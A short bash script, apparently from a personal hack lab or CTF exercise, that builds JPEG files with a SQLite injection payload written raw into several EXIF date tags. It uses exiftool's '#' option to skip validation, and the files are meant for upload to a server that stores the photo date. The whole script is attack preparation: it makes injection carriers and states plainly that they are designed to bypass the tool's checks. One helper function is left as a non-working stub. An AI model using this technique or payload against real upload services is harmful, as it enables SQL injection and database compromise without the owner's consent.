#!/bin/bash
# datetime_deep.sh — the server stores 'datetime' from EXIF. exiftool refused invalid dates,
# but we can force a raw string with -DateTimeOriginal# (the '#' = write raw value, no validation).
# Also try alternate date tags. If datetime is concatenated unescaped, injection lands here.
EXIFTOOL="/c/Users/Usuario/Documents/GonzaOrban/HackLab/exiftool/exiftool.exe"
BASE_IMG="paisaje_conv.jpg"

# payload: close the string, concat subquery, comment out the rest (SQLite: '||...||' or ',...) --')
PIPE="'||(SELECT sqlite_version())||'"

w() { # w <marker> <exiftool args...>
  cp "$BASE_IMG" d_$1.jpg
  shift 1
  local marker="$1"; :
}

mk() { # mk <marker> <tag> <value>
  cp "$BASE_IMG" d_$1.jpg
  "$EXIFTOOL" -overwrite_original -m "-$2=$3" d_$1.jpg >/dev/null 2>&1
  echo "d_$1.jpg  $2 = $("$EXIFTOOL" -s3 -$2 d_$1.jpg)"
}

# raw-write (#) bypasses exiftool's format validation
mk dto_raw   'DateTimeOriginal#' "$PIPE"
mk dt_raw    'DateTime#'         "$PIPE"
mk create    'CreateDate#'       "$PIPE"
mk modify    'ModifyDate#'       "$PIPE"
# valid-looking date then payload appended (raw)
mk dto_mix   'DateTimeOriginal#' "2025:01:01 00:00:00$PIPE"

echo
echo "upload with: python upload_deep.py"
